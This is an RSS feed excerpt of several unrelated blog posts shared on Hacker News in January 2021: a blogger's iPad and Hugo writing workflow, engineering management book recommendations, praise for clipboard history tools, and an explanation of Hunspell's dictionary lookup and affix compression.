<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a few years since I started writing this blog, and I quite like sharing my thoughts and experiences. After a short while spent on Medium, I decided I wanted to be the sole owner of my content, so I started experimenting with different solutions and ideas. After I finally landed on the “perfect” tech architecture (I know, I’m lying. There’s no perfect solution and Future Me will most likely refactor and (over)re-engineer the current solution), I started to seek the “perfect” writing setup.</p><p>I’m pretty confident I’ve ended up with something worth sharing.</p><h2>A bit about tech stack</h2><p>Before speaking about the setup, I want to spend some words about the tech stack. The site is built with <a href="https://gohugo.io/"><strong>Hugo</strong></a>, one of the most popular static site generator. It is a powerful tool that lets you have a website up and running in just a few minutes. With Hugo, you can write articles or content with <strong>Markdown</strong>, and then Markdown pages are automatically transformed into HTML and CSS pages when you build the website. But how Hugo works is not the topic of this article, so if you are interested to know a bit more, I suggest you look over the <a href="https://gohugo.io/documentation/">documentation</a>.</p><p>As mentioned above, the final output of Hugo is a static website and there are many free solutions to host it. To name a few: <a href="https://pages.github.com/">GitHub Pages</a> or <a href="https://www.netlify.com/">Netlify</a> or <a href="https://firebase.google.com/docs/hosting">Firebase Hosting</a>. Personally, I’ve always used <strong>GitHub Pages</strong> and I’m still using it. If you have trouble choosing, there is <a href="https://gohugo.io/hosting-and-deployment/">an entire section on the Hugo doc</a> there to help you.</p><p>For handling the publications, I’ve set up a little <strong>GitHub action</strong> (you can give a look at it <a href="https://github.com/prof18/marcogomiero.com/blob/master/.github/workflows/gh-pages.yml">on my GitHub</a>) that builds the website and pushes all the changes to a special branch reserved for GitHub Pages. This action is triggered every time I push something on the master branch.</p><p>That’s it for the tech stack. It was a quick but necessary overview to better introduce the context but if you have any kind of question, feel free to reach me out on Twitter <a href="https://twitter.com/marcoGomier">@marcoGomier</a>.</p><h2>Writing Setup</h2><p>My main machine is a 15” MacBook Pro - a fantastic tool for my day-to-day job. But after using it for writing some articles, I’ve discovered that a 15” machine is way too heavy, big, and overkill just for blogging.</p><p>When I’m writing something, I like to stay outside in the courtyard, sitting in the deckchair or in the hammock or in a simple chair. And when the weather does not allow it, I prefer to stay on the couch or in bed rather than in my work setup. And in all of these scenarios, my MacBook is too uncomfortable to use. So I started to think about alternatives.</p><p>First of all, I’ve tried to resurrect my old Asus T100HA with a lightweight Linux distro, but in the end I had to drop it due to issues with some drivers and a battery not at its glory anymore. So, after some thinking, I’ve decided to give <strong>iPad</strong> a try: blogging doesn’t require a big screen and CPU power, whereas it does ask for a reliable and comfortable machine, with decent autonomy.</p><p>After some research, I found out that the best compromise between my needs and my budget was the <strong>iPad Air 3</strong> (I made this choice back in May 2020. If it was today, I would choose the new iPad Air 4). For the keyboard, I decided to go with the <a href="https://www.logitech.com/en-us/products/ipad-keyboards/combo-touch.html">Logitech Combo Touch</a>.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/ipad-overview.jpeg"><img src="https://www.marcogomiero.com/img/blogging-ipad/ipad-overview.jpeg"></a></figure><p>To be honest, I quickly fell in love with this Logitech solution. With this keyboard-cover, you will transform the iPad into a notebook. With the kickstand, you can tilt the iPad up to 40 degrees. Then you have a very good trackpad (better than some Window notebooks!), a row of function keys (brightness and volume controls, home button, lock button, spotlight, etc), and backlit keys.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/keyboard-detail.jpeg"><img src="https://www.marcogomiero.com/img/blogging-ipad/keyboard-detail.jpeg"></a></figure><p>The only compromise is the fact that it makes the iPad a bit heavier and thicker.</p><h3>Applications</h3><p>As I mentioned above, the website is stored in a git repository and I manage all “the git lifecycle” through <a href="https://apps.apple.com/it/app/working-copy-git-client/id896694807?l=en"><strong>Working Copy</strong></a> that I think is the best git client that you can find in the AppStore.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/working-copy-screen.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/working-copy-screen.png" alt="Working Copy"></a><figcaption><p>Working Copy</p></figcaption></figure><p>With Working Copy you can browse the content of the repo but you can also make edits with a built-in editor that also provides the user with syntax highlighting. However, the feature that made me choose this client is the support of the File iOs app, that makes the repositories browsable from other apps too.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/working-copy-files-app.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/working-copy-files-app.png" alt="iOs File app"></a><figcaption><p>iOs File app</p></figcaption></figure><p>In this way, I can open and edit an article directly from any Markdown editor - for for the time being my go-to choice is <a href="https://apps.apple.com/it/app/mweb-powerful-markdown-app/id1183407767?l=en"><strong>MWeb</strong></a>.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/mweb-screen.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/mweb-screen.png" alt="MWeb"></a><figcaption><p>MWeb</p></figcaption></figure><p>I like it because it provides themes, a powerful preview, a useful toolbar with plenty of quick actions, and a lot of keyboard shortcuts.</p><p>In the past, I’ve used <a href="https://apps.apple.com/it/app/pretext/id1347707000?l=en">Pretext</a>, a little bit more basic. In the future, I would like to try <a href="https://apps.apple.com/it/app/ia-writer/id775737172?l=en">iA Writer</a> but it is quite expensive and I don’t know if it’s worth the investment (maybe if there will be a demo or a trial version in the future I can finally make a decision).</p><p>And that’s it! I write an article in MWeb and when I finish it, I publish it on the master branch of the Github repo through Working Client. Then, the GitHub Action is triggered and the article is live.</p><p>Bonus. If I have to edit or prepare an image for an article (like the ones below), I use <a href="https://apps.apple.com/it/app/pixelmator/id924695435?l=en"><strong>Pixelmator</strong></a>, a very good image editor for iOs.</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/pixelmator-screen.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/pixelmator-screen.png" alt="Pixelmator"></a><figcaption><p>Pixelmator</p></figcaption></figure><h3>Automations</h3><p>After writing some articles, I’ve discovered that there are some boring activities to achieve on iPad, like creating a new article, adding a new image for an article, etc. So, during one of the “its-blogging-time-but-i-dont-want-to-write” sessions (procrastination FTW) I decided to automate some of these boring things.</p><h4>Add an image to an article</h4><p>To show an image on a Hugo Markdown page, it is necessary to write a shortcode; for example, for the Pixelmator’s screen posted above the corresponding shortcode is the following:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="markdown">{{<span>&lt;</span> <span>figure</span> <span>src</span><span>=</span><span>"/img/blogging-ipad/pixelmator-screen.png"</span>  <span>link</span><span>=</span><span>"/img/blogging-ipad/pixelmator-screen.png"</span> <span>caption</span><span>=</span><span>"Pixelmator"</span> <span>&gt;</span>}}
</code></pre></td></tr></tbody></table></div></div><p>So, every time I need to add an image to an article, I need to:</p><ol><li>Create a folder into the img folder of the website (if not present. I create a folder for every article just to keep things clean);</li><li>Move the image from the iPad gallery to the folder created above;</li><li>Rename the image with a more readable format;</li><li>Write the shortcode for the image in the article.</li></ol><p>Way too many steps for a lazy person like me!</p><p>To try to automate these steps, I started playing with the <strong>Apple Shortcuts iOS app</strong>. If you’ve never heard about it, I suggest you take a peek. It’s really powerful and it can greatly simplify your life.</p><blockquote><p>A shortcut is a quick way to get one or more tasks done with your apps. The Shortcuts app lets you create your own shortcuts with multiple steps. For example, build a “Surf Time” shortcut that grabs the surf report, gives an ETA to the beach, and launches your surf music playlist. <em><a href="https://support.apple.com/guide/shortcuts/welcome/ios">Shortcuts user guide</a></em></p></blockquote><p>After some trials, I was able to achieve my goal and, as you can see in the video, when I need to add an image to an article I can launch a shortcut that does all the job for me.</p><p><iframe src="https://www.youtube-nocookie.com/embed/MdSv-PwC5N8" allowfullscreen="" title="YouTube Video"></iframe></p><p>Here’s the “source code” of the shortcut:</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/new-image-shortcut.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/new-image-shortcut.png" alt="iOs shortcut to move an image from the camera roll to the repo of the site and generate the Hugo shortcode"></a><figcaption><p>iOs shortcut to move an image from the camera roll to the repo of the site and generate the Hugo shortcode</p></figcaption></figure><p>As you can see in the image above, it is possible to ask for input and then store it in a variable. So, first of all, I receive as input the name of the image and the folder, then I open the system image picker and I store the chosen image in a variable. Then, before moving the image, I extract the file extension of the image and store it in another variable.
And now finally, it is time to move the image to the specific folder with the new name. This action is performed with the shortcut support provided by Working Copy. And at the end, I create the shortcode for the specific image and I store it in the clipboard ready to be pasted in the article.</p><h4>Create a new article draft</h4><p>Another boring activity is the creation of a new article. That’s because for every article I need to write some metadata at the top, like the date, the title, etc.</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td><td><pre><code data-lang="markdown">---
layout: post
title:  "Running a blog with iPad"
date:   2021-01-01
show_in_homepage: false
draft: true
tags: [Blogging]
---
</code></pre></td></tr></tbody></table></div></div><p>So, I made another shortcut!</p><p><iframe src="https://www.youtube-nocookie.com/embed/v18imNIwgyc" allowfullscreen="" title="YouTube Video"></iframe></p><p>And here’s the “source code” of this shortcut:</p><figure><a href="https://www.marcogomiero.com/img/blogging-ipad/new-article-draft-shortcut.png"><img src="https://www.marcogomiero.com/img/blogging-ipad/new-article-draft-shortcut.png" alt="iOs shortcut to create a new article draft with some metadata"></a><figcaption><p>iOs shortcut to create a new article draft with some metadata</p></figcaption></figure><p>The structure is very similar to the other shortcut. First of all, I make sure that I’m in the develop branch of the website where I make all the draft work. Next, I ask for some input that I store in some variables. As you can see it is also possible to do some if/else statements.
And at the end, I create the metadata that will be placed inside the new article.</p><h2>Conclusions</h2><p>And that’s how I write in my blog. I’m very happy with this setup because it let me only focus on writing. Every “boring” activity is completely automated and in this way, I have “just” to write. And by using an iPad I’m not tempted to re-open my IDE to procrastinate writing.</p><p>If you have any kind of suggestions about apps, accessories, whatever, feel free to reach me out on Twitter <a href="https://twitter.com/marcoGomier">@marcoGomier</a>.</p></div></div>]]>
            </description>
            <link>https://www.marcogomiero.com/posts/2021/running-blog-ipad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726147</guid>
            <pubDate>Mon, 11 Jan 2021 08:16:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recommended Engineering Management Books]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726109">thread link</a>) | @kiyanwang
<br/>
January 11, 2021 | https://caitiem.com/2020/12/28/recommended-engineering-management-books/ | <a href="https://web.archive.org/web/*/https://caitiem.com/2020/12/28/recommended-engineering-management-books/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main" role="main">

			
<article id="post-2053">

	

	
			<figure>
				<img width="1019" height="501" src="https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=1019" alt="" loading="lazy" srcset="https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg 1019w, https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=150 150w, https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=300 300w, https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=768 768w" sizes="(max-width: 1019px) 100vw, 1019px" data-attachment-id="2109" data-permalink="https://caitiem.com/2020/12/28/recommended-engineering-management-books/books20130912-2/" data-orig-file="https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg" data-orig-size="1019,501" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="books20130912" data-image-description="" data-medium-file="https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=300" data-large-file="https://caitiem20.files.wordpress.com/2020/12/books20130912-1.jpg?w=782">			</figure><!-- .post-thumbnail -->

			
	<div>
		
<p>Over the past 3.5 years my career has grown and transformed from Individual Contributor (IC) to an Engineering Manager of multiple teams, and all the roles in between as I built the Azure Sphere Security Services (AS3) Team from 2 people to 20 people.&nbsp; I undertook this journey in the Summer of 2017 to help transform a <a href="https://www.wired.com/story/project-sopris-iot-security/">Microsoft Research project, Project Sopri</a>s, into a Generally Available (GA) product <a href="https://azure.microsoft.com/en-us/services/azure-sphere/">Azure Sphere</a>.&nbsp;</p>



<p>As the AS3 Team grew, I went through a massive amount of personal growth and learning as well.&nbsp; In December 2017 I stepped into a manager role for the first time in my career.&nbsp; I had been a professional software engineer for over a decade at this point, and was up for a totally new challenge.&nbsp; I knew that the skills and job of growing and managing a team and then an organization were totally different than what I had been actively developing over the last decade of my career.&nbsp; As I went through this period of growth I was lucky enough to have several friends, coaches, and mentors share their experiences with me, and recommend some great books to help me along my learning journey.&nbsp; </p>



<p>Below is my curated list of the most influential and impactful books that helped me along the way, and that I highly recommend to Engineering Managers&nbsp;</p>



<h2>The Manager’s Path: A Guide for Tech Leaders Navigating Growth &amp; Change by Camille Fournier</h2>



<div><figure><img src="https://m.media-amazon.com/images/I/51BHEtpF4eL._SY346_.jpg" alt="" width="299" height="450"></figure></div>



<p>This is a must read for anyone considering managing engineering teams, it is as good as or better than the hype surrounding it.&nbsp; The book starts off from the individual contributor perspective and then each subsequent chapter explores the next level of management complexity.&nbsp; Each chapter focuses on an engineering management role, like technical lead, manager of people, or manager of multiple teams, and manager of managers.</p>



<p>Over the past 3.5 years I’ve come back to this book several times, re-reading the chapters around my newest role.&nbsp; For instance when I transitioned into a manager of managers role, I re-read that chapter and the one before and after it.&nbsp; These were great reminders on what I should be focused on, what challenges my directs were facing, and what challenges and motivations my boss was focused on.&nbsp;</p>



<p>One of the sections I really loved was on debugging dysfunctional teams.&nbsp; As an engineer I am a great debugger, often able to piece together logs, metrics, and weird behavior to diagnose what’s going wrong in a system.&nbsp; This was the first time I had seen the term debugging applied to people and organizations, and it helped frame the work of how to start investigating dysfunction in a team, and how to discover the source of the problem.&nbsp;</p>



<p>Honestly I recommend this book to every engineer, solely for the chapter on how to be managed, and what you should and can expect from your manager.&nbsp; Even if you never plan on taking on a management role this book provides an excellent overview of the challenges and motivations of folks in varying levels of an engineering organization and will help you better navigate your org.&nbsp;</p>



<h2>Thanks for the Feedback by Douglas Stone &amp; Sheila Heen</h2>



<p>Prior to managing I had given peer feedback as part of performance reviews at various companies, but I did not consider this a strength of mine.&nbsp; Now giving feedback was a critical skill for my role as a manager.&nbsp; Early on I sought out several resources on how to give and receive feedback well, and found “Thanks for the Feedback” to be an tremendous resource.</p>



<div><figure><img src="https://blackwells.co.uk/jacket/l/9780670922635.jpg" alt="" width="336" height="512"></figure></div>



<p>Thanks for the Feedback is framed as a resource for receiving and processing the multitudes of feedback you receive.&nbsp; However, any one who reads this book, will also learn how to be a more skilled feedback giver.&nbsp;</p>



<p>I highly recommend reading the book in its entirety, but I wanted to share one of the fundamental ideas in this book that resonated with me.&nbsp; Feedback is really three different things, with three different purposes:</p>



<ul><li><strong>Appreciation</strong>,&nbsp; the goal is to help people feel appreciated.&nbsp; Sometimes they may just need motivation and encouragement to keep going when tackling tough problems</li><li><strong>Coaching</strong>, the goal is to help the receiver expand their knowledge, sharpen skills, and increase confidence.&nbsp;</li><li><strong>Evaluation,</strong> the goal here is to rate or rank the receiver’s work against a set of standards to align expectations and inform decision making.&nbsp;</li></ul>



<p>This idea that feedback serves a variety of different purposes was eye opening, and help me more clearly think about how and when to provide feedback.&nbsp; Taking this perspective along with the multitude of lessons learned from this book was tremendously helpful to me.</p>



<h2>The Hard Thing About Hard Things: Building a Business When There are No Easy Answers by Ben Horowitz</h2>



<div><figure><a href="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg"><img loading="lazy" data-attachment-id="2057" data-permalink="https://caitiem.com/image-1/" data-orig-file="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg" data-orig-size="1752,2560" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=205" data-large-file="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=701" src="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=701" alt="" width="251" height="367" srcset="https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=251 251w, https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=502 502w, https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=103 103w, https://caitiem20.files.wordpress.com/2020/12/image-1.jpeg?w=205 205w" sizes="(max-width: 251px) 100vw, 251px"></a></figure></div>



<p>The book starts off acknowledging a problem with most management books “they attempt to provide a recipe for challenges that have no recipes.&nbsp; There’s no recipe for really complicated, dynamic situations.”&nbsp; This instantly resonated with me as I was reading it in November 2019.&nbsp; I had been a manager for about two years, and had grown the AS3 team from 2 to 15 people.&nbsp; We’d spent the past two years turning a research project into what would soon be a GA’d product in February 2020.&nbsp; There is no recipe for how to do this, what I was doing was a hard thing.&nbsp;</p>



<p>Horowitz packs the book with a variety of entertaining stories from his career as a venture capitalist and entrepreneur to emphasize his message and points on leadership and various challenges.&nbsp; In addition there are a few key takeaways that have stayed with me.</p>



<ul><li><strong>Take care of the people, the product, and the profits in that order</strong>.&nbsp; This quote resonated with me and the kind of organization I want to build and run.&nbsp; Chapter 5, which bears this quote as a title goes into some of the challenges that can arise when setting out with this mission and how to overcome them, like hiring, training, and management debt.&nbsp;</li><li><strong>Part of Management is training your people.</strong> In big companies this is often neglected as it’s the role of HR or corporate to produce training programs.&nbsp; These can sometimes be valuable but are often overly generic.&nbsp; As a manager make sure you are training your people for the specific job they are doing.&nbsp; Things like how to work in your specific code base, what are the architectural standards and guidelines, what makes a good design doc, etc…Make sure you are intentionally designing on boarding programs, meetings, and workshops to facilitate learning.</li></ul>



<h2>Accelerate: Building and Scaling High Performing Technology Organizations by Nicole Forsgren, PhD, Jez Humble, and Gene Kim</h2>



<div><figure><img src="https://itrevolution.com/wp-content/uploads/2017/09/Accelerate_3D_Shingo-e1567716184319.jpg" alt="" width="331" height="473"></figure></div>



<p>Accelerate is a summary of the research and learnings discovered by Dr Forsgren and her colleagues from the 2014-2017 State of DevOps report.&nbsp; This book is a must read for any engineering leader, as it gives you a clear outline on how to set your team up for success by investing in 24 key capabilities which will drive improvement in your teams software delivery performance.&nbsp;</p>



<p>There are some non-surprising findings like using version control is important to team performance, and other not so obvious ones like focusing on continuous integration and software delivery performance positively impacts culture.</p>



<p>This book and the ongoing research released by Dr. Forsgren, et. Al has had a huge influence on the priorities of my team.&nbsp; We embraced Accelerate principles early on in the development of the Azure Sphere Security Services, and that investment has paid huge dividends over time.&nbsp;</p>



<h2>Dare to Lead: Brave Work.&nbsp; Tough Conversations.&nbsp; Whole Hearts. by Brene Brown</h2>



<p>I’m a huge fan of Brene Brown’s work as a shame and vulnerability researcher.&nbsp; In October 2018 she released Dare to Lead applying her research to Leadership.&nbsp; This quote sums up why this book is important</p>



<div><figure><img src="https://pictures.abebooks.com/isbn/9780399592522-us.jpg" alt="" width="343" height="520"></figure></div>



<p>“There’s an old saying that I lead by now: “People don’t care how much you know until they know how much you care.” Brene Brown</p>



<p>This book dives into what it takes to become a brave and courageous leader.&nbsp; Spoiler a lot of it involves embracing vulnerability and living authentically, something that is far easier to say than do.&nbsp; The book defines vulnerability as “the emotion we experience during times of uncertainty, risk, and emotional exposure…Vulnerability is not winning or losing.&nbsp; It’s having the courage to show up when you can’t control the outcome.”</p>



<p>One section I continually return to is the definitions of the two leadership styles: armored leadership and daring leadership.&nbsp; Brown’s research uncovered 16 traits for each of these leadership styles and breaks each one of them down.&nbsp; I highly recommend going through these periodically and checking in on your own leadership style and where there is room for growth and improvement.&nbsp;</p>



<p>Another great exercise that Brown presents in the book is one around values.&nbsp; She challenges readers to pick one to two core values, not ten or fifteen, because as Jim Collins said “If you have more than three priorities, you have no priorities.”&nbsp; Having clarity around your core values allows you to live and lead more authentically.&nbsp;</p>



<p>Overall this book is one of the best for dealing with the “soft skills” of leadership.&nbsp; How do you show up whole heartedly and help create a team that can do the same is one of the biggest challenges of taking on a management role.&nbsp;</p>



<h2>Switch: How to Change Things When Change is Hard</h2>



<div><figure><img src="https://images-na.ssl-images-amazon.com/images/I/81QxTfW8-PL.jpg" alt="" width="356" height="511"></figure></div>



<p>This book is an awesome resource for understanding the psychology and sociology behind what motivates people and how to be successful enacting change from small to epic scale.  I loved this book as it provides real practical tips for how to enact change across a team or organization through researched principles and real world examples.&nbsp;</p>



<p>The book starts by acknowledging that people have both emotional and rational sides, and motivating each is important for effective change.&nbsp; In engineering orgs we often only motivate the rationale side, because the analytical brain is all important.&nbsp; Sometimes …</p></div></article></main></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://caitiem.com/2020/12/28/recommended-engineering-management-books/">https://caitiem.com/2020/12/28/recommended-engineering-management-books/</a></em></p>]]>
            </description>
            <link>https://caitiem.com/2020/12/28/recommended-engineering-management-books/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726109</guid>
            <pubDate>Mon, 11 Jan 2021 08:10:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The clipboard history feature is the best thing since sliced bread]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25726043">thread link</a>) | @madewulf
<br/>
January 11, 2021 | https://multitasked.net/2021/01/11/the-clipboard-history.html | <a href="https://web.archive.org/web/*/https://multitasked.net/2021/01/11/the-clipboard-history.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>For those who do not know, having a clipboard history is the best thing since sliced bread.</p>

<p>It is that little feature that allows you, after you made a few copy actions (ctrl+c on Windows or command-c on Mac), to choose any of the copied texts to paste it.</p>

<p>It looks like this when I use <a href="https://www.alfredapp.com/">Alfred</a>, a productivity tool on Mac, by pression option-command-c (the three buttons at once).</p>

<p><img src="https://multitasked.net/uploads/2021/302b4c92a6.png" width="480" height="451" alt=""></p>

<p>Just click on the text you want, and it will be copied wherever your cursor happened to be.</p>

<p>You can even search in your clipboard history for something you copied a few days before, as in this screenshot.
<img src="https://multitasked.net/uploads/2021/394bad9b53.png" width="480" height="451" alt=""></p>

<p>This feature is a huge time saver. There is a lot of alternative apps providing this feature and apparently, it’s now a standard part of <a href="https://www.howtogeek.com/671222/how-to-enable-and-use-clipboard-history-on-windows-10/">Windows 10 too</a>.</p>

<p>Remember all these times where you have to copy a few distinct cells from an Excel file to insert them in a report, and how you switch constantly between the documents? With this feature, you can just copy one by one all the cells that you want, switch to your report (only once!), and paste one by one the values you needed.</p>

<p>Or, are you looking for that email address you sent yesterday? Just open your clipboard history, type a few letters of the name of the person, and there you go, it’s here. You don’t have to open your emails, perform a search, it is just right there, and it very often allows you to stay focused on your current task.</p>

<p>So, you get it, I love it. You should use it. I know I sound like a cheesy salesman here, but that is how convinced I am.</p>

    </div></div>]]>
            </description>
            <link>https://multitasked.net/2021/01/11/the-clipboard-history.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726043</guid>
            <pubDate>Mon, 11 Jan 2021 08:01:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker, pt.2: Just look in the dictionary, they said]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725583">thread link</a>) | @zverok
<br/>
January 10, 2021 | https://zverok.github.io/blog/2021-01-09-spellchecker-2.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p><strong><em>This is the second part of the “Rebuilding the spellchecker” series, dedicated to the explanation of how the world’s most popular spellchecker Hunspell works.</em></strong></p>

<p><strong>Quick recap:</strong> <a href="https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">In the first part</a>, I’ve described what Hunspell is; and why I decided to rewrite it in Python. It is an <strong>explanatory rewrite</strong> dedicated to uncovering the knowledge behind the Hunspell by “translating” it into a high-level language, with a lot of comments.</p>

<p>Now, let’s dive into how the stuff really works!</p>

<p>There are two main parts of word-by-word spellchecker algorithms:</p>

<ol>
  <li>Check if a word is correct: <strong>“lookup”</strong> part</li>
  <li>Propose the correction for incorrect words: <strong>“suggest”</strong> part</li>
</ol>

<blockquote>
  <p>Hunspell also implements several other algorithms to be useful as standalone software. It can extract plain text from numerous formats, like HTML or TeX, split it into words (tokenize), correctly handling punctuation—but at the end of the day, a word-by-word correctness check is applied. I excused myself from implementing “wrapper” algorithms: text extraction and tokenization are thoroughly investigated topics, and there are numerous libraries in any language solving it with decent speed and quality.</p>
</blockquote>

<p>Hunspell works on a word-by-word basis (no context is taken into account). Each word is just <strong>looked up</strong> in the <strong>dictionary</strong> loaded from the plaintext  <code>&lt;langname&gt;.dic</code> file in Hunspell-specific format. If it is not considered correct by dictionary lookup (which, as we’ll see soon, is more complex than “is it present in the dictionary”), several algorithms of <strong>suggest</strong> are applied sequentially, trying to find correct words similar to the given one.</p>

<h2 id="hunspells-lookup-algorithm-or-just-look-in-the-dictionary-they-said">Hunspell’s lookup algorithm, or, Just look in the dictionary, they said!</h2>

<p>When coming from English-only spellchecking, the developers tend to perceive the “lookup” part as trivial (e.g., the famous <a href="https://norvig.com/spell-correct.html">Peter Norvig’s article</a> starts from the assumption that only the correction—”suggest”—part deserves some explanations). But that’s not quite so.</p>

<p>The first and most straightforward idea<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> for the lookup would be: we’ll just take the dictionary (presumably, the flat list of all correct words) and look for our candidate word in this list: if it is there, it is correct. End of story.</p>

<p>Now, Hunspell’s dictionaries exist for many languages and have a plaintext format, which, at the first sight is quite close to a plain word list—so, probably it would be easy to reuse them? Let’s take a look into the <a href="https://github.com/LibreOffice/dictionaries/blob/master/en/en_US.dic"><code>en_US.dic</code></a> in the LibreOffice dictionary repository. You’ll see a list of words in the following format:</p>

<div><div><pre><code>...
acetyl
acetylene/M
ache/DSMG
achene/MS
achievable/U
achieve/BLZGDRS
achievement/SM
...
</code></pre></div></div>

<p>The line <code>ache/DSMG</code> specifies the <em>stem</em> <code>ache</code>, having <code>D</code>, <code>S</code>, <code>M</code>, <code>G</code> <em>flags</em> associated with it. The meaning of flags is defined by <a href="https://github.com/LibreOffice/dictionaries/blob/master/en/en_US.aff"><code>en_US.aff</code></a> (called “affix file”, or just aff-file; every Hunspell dictionary is distributed as a pair of <code>.dic</code> and <code>.aff</code> files).</p>

<h3 id="affix-compression">Affix compression</h3>

<p>In this particular case, all four flags are associated with word <em>suffixes</em>. Here’s the definition of <code>D</code> suffix:</p>

<div><div><pre><code>SFX D Y 4                    # Suffix header: suffix (SFX), with flag D, combinable with prefixes (Y), 4 entries:
SFX D   0  d    e            # * if the stem ends is "e", strip nothing (0), and add "d"
SFX D   y  ied  [^aeiou]y    # * if the stem ends with "y", preceded by non-vowel, strip "y" and add "ied"
SFX D   0  ed   [^ey]        # * if the stem ends with not "e", and not "y", strip nothing, add "ed"
SFX D   0  ed   [aeiou]y     # * "y" with preceding vowel: strip nothing, add "ed"
</code></pre></div></div>

<p>For our <code>ache</code> stem, this definition says that form <code>ached</code> exists. In the similar fashion, <code>S</code> flag defines that word <code>aches</code> exists, <code>G</code> flag defines <code>aching</code>, <code>M</code> flag defines <code>ache's</code>. So, the <code>ache/DSMG</code> line in <code>.dic</code> file specifies 5 correct words: “ache”, “ached”, “aches”, “aching”, “ache’s”.</p>

<blockquote>
  <p>Note: the fact that flags are similar to the suffixes they define (<code>S</code> flag defines suffix <code>-s</code> and so on) is just a convention. It is rather a handy mnemonics that creators of <code>en_US</code> dictionary used, and there could be any other symbol.</p>
</blockquote>

<p>In the similar fashion, word prefixes might be defined (specified with flags in dic-file, and described with <code>PFX</code> directive in aff-file). Say, this definition:</p>



<p>…defines these forms: <em>advantage, advantage’s, advantaging, advantaged, advantages, disadvantage’s, disadvantaging, disadvantaged, disadvantages, disadvantage</em> (all combinations of four suffixes and a prefix “dis-“).</p>

<p>This technique of “packing” dictionaries is called <strong>affix compression</strong>, and its primary goal is to optimize dictionary size: on disk and in memory. It becomes extremely important for languages with rich inflection. For example, in English one stem might produce no more than ten forms, but in Ukrainian it could easily be dozens or even hundreds, so the amount of possible correct forms quickly grows to tens of millions. “Just a flat list of all known words” <em>might</em> become impractical (not on today’s top MacBook, probably, but still), and that’s where the affix compression comes in handy.</p>

<blockquote>
  <p>This is not the only possible approach to make dictionary storage more effective: for example, <a href="https://github.com/morfologik/morfologik-stemming">morfologik</a> (the default internal spellchecker of the most widely used open-source proofreading software <a href="https://languagetool.org/">LanguageTool</a>) codes <em>all</em> possible forms in binary files, using finite-state automata. And this approach is very efficient by speed and memory, but very hard for humans to edit and review, and thus, to keep dictionary up-to-date.</p>
</blockquote>

